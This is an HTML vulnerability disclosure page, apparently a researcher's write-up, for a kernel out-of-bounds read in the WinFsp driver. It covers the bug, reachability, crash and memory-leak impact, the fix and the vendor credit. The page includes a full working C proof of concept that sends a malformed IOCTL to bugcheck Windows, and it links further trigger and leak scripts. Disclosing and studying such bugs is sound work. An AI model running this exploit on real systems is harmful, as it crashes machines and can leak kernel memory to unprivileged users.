@@ -1,0 +1,153 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>WinFsp Kernel OOB Read &mdash; Wencheng Xue</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="STYLESHEET" type="text/css" href="assets/site.css">
+</head>
+<body>
+<div class="topmenu">
+<a class="topmenu" href="index.html">front</a>
+<a class="topmenu" href="index.html#research">research</a>
+<a class="topmenu" href="index.html#projects">projects</a>
+<a class="topmenu" href="index.html#elsewhere">contact</a>
+</div>
+<div class="main">
+<div class="content">
+<div class="title" style="font-size:165%">WinFsp &mdash; Kernel Out-of-Bounds Read &amp; Pool Memory Disclosure</div>
+<p class="status">winfsp-x64.sys &middot; CWE-125 &middot; CVSS 7.1 &middot; affects v1.8&ndash;v2.2B3 &middot; Credited &mdash; v2.2B4</p>
+<p class="lead">An unprivileged local user can bugcheck the Windows kernel and leak non-paged pool memory through a missing per-record bounds check in WinFsp&rsquo;s <code>FSP_FSCTL_NOTIFY</code> handler.</p>
+<div class="subtitle">The bug</div><p>The <code>FSP_FSCTL_NOTIFY</code> IOCTL accepts a user buffer holding a sequence of <code>FSP_FSCTL_NOTIFY_INFO</code> records, each carrying its own 16-bit <code>Size</code>. The kernel worker <code>FspVolumeNotifyWork</code> checks <code>Size &gt;= sizeof(FSP_FSCTL_NOTIFY_INFO)</code> (a lower bound) but never checks that <code>Size</code> fits within the remaining input buffer (the missing upper bound). A single record with <code>Size = 0xFFFF</code> inside a ~10&ndash;12&nbsp;byte buffer makes the driver compute <code>FileName.Length = 0xFFFF &minus; 12 = 65,523</code> and treat the few bytes of adjacent kernel pool after the record as a 65&nbsp;KB wide-character path. <code>FspFileNameIsValid</code> then walks that range one <code>WCHAR</code> at a time, reading ~64&nbsp;KB past the allocation.</p><div class="subtitle">Reachability</div><p>The device object <code>\Device\WinFsp.Disk</code> grants <code>GENERIC_READ</code> to <em>Everyone</em>, and opening a volume-control channel performs no additional privilege check, so any unprivileged local user can reach the vulnerable path.</p><div class="subtitle">Impact &mdash; denial of service</div><p>Independent testing on Windows&nbsp;Server&nbsp;2025 (24H2) produced a deterministic <code>0x50</code> bugcheck (<code>PAGE_FAULT_IN_NONPAGED_AREA</code>). The fault occurs at <code>winfsp-x64.sys + 0x2355c</code> during the wide-character walk, at a delta of 65,532&nbsp;bytes past the record base &mdash; matching the predicted ~64&nbsp;KB overshoot from an attacker-controlled <code>0xFFFF</code> size.</p><div class="subtitle">Impact &mdash; kernel memory disclosure</div><p>The walked bytes are handed back to a user-mode process through directory change-notifications, turning the overread into a read primitive. With pool grooming using sentinel <code>&#39;K&#39;</code> characters, the driver was shown to return bytes from separate, already-freed kernel allocations: 150/150 injections leaked memory without crashing the machine (Driver Verifier Special Pool disabled). That is enough to disclose kernel and driver pointers and defeat KASLR.</p><div class="subtitle">The fix</div><p>Both effects are resolved by validating the record <code>Size</code> against the remaining buffer before the filename walk:</p><pre class="quote">if (NotifyInfo-&gt;Size &gt; (ULONG_PTR)NotifyInfoEnd - (ULONG_PTR)NotifyInfo)
+    break;   /* reject records that overrun the input buffer */</pre><p>The report is credited in the WinFsp <a href="https://github.com/winfsp/winfsp/releases/tag/v2.2B4" target="_blank" rel="noopener">v2.2B4 release</a>.</p><figure><img class="shot" src="assets/winfsp.png" alt="WinFsp v2.2B4 release credit" loading="lazy"><figcaption>WinFsp 2026 Beta4 &mdash; &ldquo;Fixes vulnerability reported by Wencheng Xue.&rdquo;</figcaption></figure><div class="subtitle">Proof of concept</div><p><code>poc.c</code> &mdash; a self-contained trigger that opens the device, builds one record with <code>Size = 0xFFFF</code>, and fires the IOCTL:</p><pre class="quote">/*
+ * PoC — WinFsp FSP_FSCTL_NOTIFY per-record Size OOB read.
+ *
+ * Runs from any user account. Opens \Device\WinFsp.Disk with GENERIC_READ,
+ * creates an unprivileged file-system control channel via the &#x27;\VolumeParams=&#x27;
+ * suffix, then sends a single FSP_FSCTL_NOTIFY IOCTL carrying one
+ * FSP_FSCTL_NOTIFY_INFO record whose Size field claims 0xFFFF bytes
+ * (attacker-supplied wide value) while the real IOCTL input is only 12 bytes.
+ *
+ * The asynchronous worker (FspVolumeNotifyWork) then walks up to ~65 KB of
+ * kernel-pool memory past the allocated work item and dereferences the range
+ * as if it were a wide-character path. Expected outcome on an unpatched host
+ * with a fresh boot: kernel BSOD (KERNEL_MODE_HEAP_CORRUPTION or
+ * PAGE_FAULT_IN_NONPAGED_AREA) or a hang.
+ *
+ * Build on Kali (cross-compile to Windows x86-64):
+ *   x86_64-w64-mingw32-gcc poc.c -o poc.exe -static -Wall -O2
+ *
+ * Build on Windows (MSVC):
+ *   cl /W3 /O2 poc.c
+ *
+ * Usage on the target Windows host:
+ *   .\poc.exe
+ *
+ * Non-destructive: the PoC does not attempt code execution. Only triggers
+ * the kernel OOB read. Run only in a lab VM you can reboot.
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+
+/*
+ * Note on the device path: WinFsp does not create a \DosDevices\ symlink for
+ * its FSCTL device, so \\?\WinFsp.Disk\... does not resolve. The correct path
+ * is the object-manager root form \\?\GLOBALROOT\Device\WinFsp.Disk\..., which
+ * is what WinFsp&#x27;s own DLL uses (see src/dll/fsctl.c GLOBALROOT define).
+ */
+#define DEVICE_PATH_PREFIX  L&quot;\\\\?\\GLOBALROOT\\Device\\WinFsp.Disk\\VolumeParams=&quot;
+
+/* From inc/winfsp/fsctl.h. FSP_FSCTL_NOTIFY = CTL_CODE(FILE_DEVICE_FILE_SYSTEM,
+ * 0x800 + &#x27;n&#x27;, METHOD_NEITHER, FILE_ANY_ACCESS). */
+#define FSP_FSCTL_NOTIFY \
+    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 0x800 + &#x27;n&#x27;, METHOD_NEITHER, FILE_ANY_ACCESS)
+
+/* Match inc/winfsp/fsctl.h:324-330. */
+#pragma pack(push, 1)
+typedef struct {
+    UINT16 Size;
+    UINT32 Filter;
+    UINT32 Action;
+    /* WCHAR FileNameBuf[]; */
+} FSP_FSCTL_NOTIFY_INFO;
+#pragma pack(pop)
+
+/* Build the &#x27;\VolumeParams=&lt;encoded&gt;&#x27; suffix used by FspVolumeCreateNoLock.
+ * Each byte of the FSP_FSCTL_VOLUME_PARAMS struct is encoded as one WCHAR
+ * whose upper byte is 0xF0 and lower byte carries the payload. See
+ * src/sys/volume.c:203-212. Zero-filling the struct yields a valid default
+ * volume-params blob; the driver applies its own field defaults. */
+static void build_volume_params_path(WCHAR *out, size_t out_wchars) {
+    lstrcpyW(out, DEVICE_PATH_PREFIX);
+    size_t prefix = lstrlenW(out);
+
+    /* FSP_FSCTL_VOLUME_PARAMS is variable-sized; the driver accepts any length
+     * &gt;= sizeof(FSP_FSCTL_VOLUME_PARAMS_V0) (456) and iterates up to
+     * sizeof(FSP_FSCTL_VOLUME_PARAMS) (504). Encoding is: each byte of the
+     * struct becomes one WCHAR (0xF000 | byte). See src/sys/volume.c:199-212.
+     * Zero-fill → Version=0 → treated as V0 → driver applies default values. */
+    const size_t vp_wchars = 504;
+    for (size_t i = 0; i &lt; vp_wchars &amp;&amp; prefix + i + 1 &lt; out_wchars; i++)
+        out[prefix + i] = (WCHAR)(0xF000 | 0x00);
+    out[prefix + vp_wchars] = L&#x27;\0&#x27;;
+}
+
+int wmain(void) {
+    WCHAR path[2048];
+    build_volume_params_path(path, sizeof(path) / sizeof(WCHAR));
+
+    wprintf(L&quot;[*] opening volume-control handle via \\Device\\WinFsp.Disk ...\n&quot;);
+    HANDLE h = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        DWORD err = GetLastError();
+        fwprintf(stderr, L&quot;[-] CreateFileW failed: %lu\n&quot;, err);
+        if (err == ERROR_FILE_NOT_FOUND)
+            fwprintf(stderr,
+                     L&quot;    (WinFsp not installed? \\Device\\WinFsp.Disk absent.)\n&quot;);
+        return 1;
+    }
+    wprintf(L&quot;[+] handle: %p\n&quot;, h);
+
+    /* Build a single malicious record. Real input length = 12 bytes.
+     * Declared record Size = 0xFFFF → per-record walk claims a 65523-byte
+     * WCHAR filename lives at offset 12 within our 12-byte allocation.  */
+    FSP_FSCTL_NOTIFY_INFO rec;
+    rec.Size   = 0xFFFF;    /* attacker-supplied lie */
+    rec.Filter = 0x00000001; /* FILE_NOTIFY_CHANGE_FILE_NAME */
+    rec.Action = 0x00000001; /* FILE_ACTION_ADDED */
+
+    wprintf(L&quot;[*] sending FSP_FSCTL_NOTIFY IOCTL (input = %zu bytes, &quot;
+            L&quot;record.Size = 0x%04x)\n&quot;,
+            sizeof(rec), rec.Size);
+
+    DWORD returned = 0;
+    /* METHOD_NEITHER → InputBuffer / OutputBuffer are Type3InputBuffer.
+     * DeviceIoControl fills IrpSp-&gt;Parameters.FileSystemControl.Type3InputBuffer
+     * with lpInBuffer. */
+    BOOL ok = DeviceIoControl(h,
+                              FSP_FSCTL_NOTIFY,
+                              &amp;rec, (DWORD)sizeof(rec),
+                              NULL, 0,
+                              &amp;returned, NULL);
+
+    if (!ok)
+        fwprintf(stderr, L&quot;[!] DeviceIoControl returned FALSE: %lu\n&quot;,
+                 GetLastError());
+    else
+        wprintf(L&quot;[+] IOCTL accepted (async worker will run in kernel).\n&quot;);
+
+    wprintf(L&quot;[*] async FspVolumeNotifyWork now scheduled. Expect BSOD within\n&quot;
+            L&quot;    a few seconds if the kernel-pool OOB read hits unmapped\n&quot;
+            L&quot;    memory.\n&quot;);
+
+    CloseHandle(h);
+    return 0;
+}</pre><div class="dl"><a href="assets/winfsp/poc.c" download>poc.c</a><a href="assets/winfsp/trigger.ps1" download>trigger.ps1 (PowerShell, no build step)</a><a href="assets/winfsp/disclosure-poc.cs" download>disclosure-poc.cs (leak harness)</a></div><p class="note" style="margin-top:14px">Tested under a VM snapshot. The IOCTL schedules an asynchronous kernel worker, so the machine bugchecks within a few seconds of the call.</p>
+<hr class="sep">
+<p class="back"><a href="index.html#research">&larr; back to research</a></p>
+</div>
+</div>
+</body>
+</html>
